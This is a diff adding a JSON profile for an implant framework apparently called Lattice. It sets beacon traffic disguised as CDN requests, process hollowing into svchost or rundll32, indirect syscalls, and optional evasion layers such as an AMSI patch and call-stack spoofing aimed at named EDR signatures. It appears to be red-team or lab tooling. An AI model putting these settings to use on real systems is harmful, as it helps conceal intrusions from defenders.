@@ -1,0 +1,69 @@
+{
+  "_comment": "Lattice 3-plane profile. Three orthogonal dimensions: wire (traffic), operational (behavior), opsec (evasion).",
+
+  "wire_plane": {
+    "_comment": "Controls what the traffic looks like on the wire. Changing this alone does not change agent behavior or evasion posture.",
+    "protocol": "https",
+    "host": "updates.example.com",
+    "port": 443,
+    "uri_patterns": [
+      "/cdn/assets/{random:8}.js",
+      "/api/v2/telemetry",
+      "/img/{random:12}.png"
+    ],
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Cache-Control": "no-cache"
+    },
+    "cookie_field": "sid",
+    "beacon_id_field": "X-Request-ID",
+    "sleep_ms": 60000,
+    "jitter_pct": 15,
+    "ja4_target": null,
+    "_ja4_note": "null = use platform default (WinHTTP/Schannel fingerprint). Set to a target JA4 hash to configure TLS params accordingly — requires custom TLS stack."
+  },
+
+  "operational_plane": {
+    "_comment": "Controls agent behavior independent of wire format. These settings affect what the agent does, not how traffic looks.",
+    "fork_and_run": false,
+    "_fork_and_run_note": "false = in-process BOF execution (lower footprint, no child process). true = spawn sacrificial process (more resilient to BOF crashes).",
+    "spawn_to_x64": "%windir%\\sysnative\\svchost.exe",
+    "spawn_to_x86": "%windir%\\syswow64\\rundll32.exe",
+    "injection_target_class": "signed_hollowable",
+    "_injection_note": "Options: signed_hollowable | any_suspended | existing_pid",
+    "memory_alloc": "indirect_syscall",
+    "_memory_alloc_note": "Options: direct_api | indirect_syscall | ntdll_trampoline",
+    "bof_timeout_ms": 30000,
+    "max_background_bofs": 4,
+    "missed_checkins_dead_threshold": 10,
+    "task_result_channel": "inline",
+    "_task_result_note": "Options: inline (same connection) | async_post (separate POST)"
+  },
+
+  "opsec_plane": {
+    "_comment": "Controls which evasion layers are active. OTA hot-swappable via TASK_PROFILE_HOT without cycling the implant.",
+    "sleep_mask": {
+      "type": "plain",
+      "_type_note": "Options: plain | timer_queue_apc | fiber. plain = no masking (lab use).",
+      "encrypt_heap": false,
+      "_encrypt_heap_note": "XOR-encrypt heap allocations before sleep. Defeats Moneta heap scan."
+    },
+    "call_gate": {
+      "enabled": false,
+      "gate_dll": "ntdll.dll",
+      "_call_gate_note": "When enabled, all WinAPI calls are proxied through gate_dll to normalize call-stack origin. See research-report-lattice-architecture-ideas.md §call-gate."
+    },
+    "etwti_avoidance": "none",
+    "_etwti_note": "Options: none | indirect_syscall | hardware_breakpoint. hardware_breakpoint is detectable via Kernel-Audit-API-Calls ETW. none recommended for lab.",
+    "cfg_spoof": {
+      "enabled": false,
+      "gadget_chain": []
+    },
+    "_cfg_note": "When enabled, inserts ROP gadgets from known DLLs into the call stack before sensitive calls. Breaks Elastic call_stack_contains_unbacked == true signature.",
+    "amsi_patch": "none",
+    "_amsi_note": "Options: none | in_process. in_process patches AmsiScanBuffer; detectable via Kernel-Audit-API-Calls. Avoid in production."
+  }
+}
